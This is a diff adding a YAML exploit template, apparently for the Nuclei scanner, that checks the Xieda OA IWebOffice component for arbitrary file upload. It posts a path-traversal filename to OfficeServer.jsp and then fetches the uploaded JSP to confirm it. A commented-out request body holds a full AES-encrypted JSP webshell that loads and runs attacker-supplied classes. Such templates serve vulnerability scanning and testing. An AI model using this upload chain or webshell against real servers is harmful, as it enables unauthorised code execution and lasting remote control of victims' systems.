@@ -1,0 +1,50 @@
+id: poc-local-oa-xiedaOA-IWebOffice-upload
+
+info:
+  name: OA-协达OA-IWebOffice组件任意文件上传漏洞"
+  author: capiton
+  severity: critical
+  tags: xieda
+
+variables:
+  random: '{{rand_text_alphanumeric(8, "")}}'
+  md5_random: '{{md5(random)}}'
+  payload: '{{base64("/../IWebOffice/" + random + ".jsp")}}'
+  # payload: '{{randstr}}'
+
+requests:
+  - method: POST
+    id: upload
+    path:
+      - "{{RootURL}}/IWebOffice/OfficeServer.jsp"
+    headers:
+      Accept: "text/html,application/xhtml+xm1,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+      Accept-Encoding: gzip,deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Content-Type: text/plain 
+    body: "DBSTEP V3.01     89             0               565             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUFTSFRNTA==\r\nHTMLNAME={{payload}}\r\n{{md5_random}}"
+#webshell # body: "DBSTEP V3.01     89             0               565             DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUFTSFRNTA==\r\nHTMLNAME={{payload}}\r\n{{md5(random)}}<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
+  - method: GET
+    id: webshell
+    path:
+      - "{{RootURL}}/IWebOffice/{{random}}.jsp"
+
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_random}}"
+
+      # - type: dsl
+      #   condition: and   
+      #   dsl:
+      #     - "contains(body_2,md5_random)"
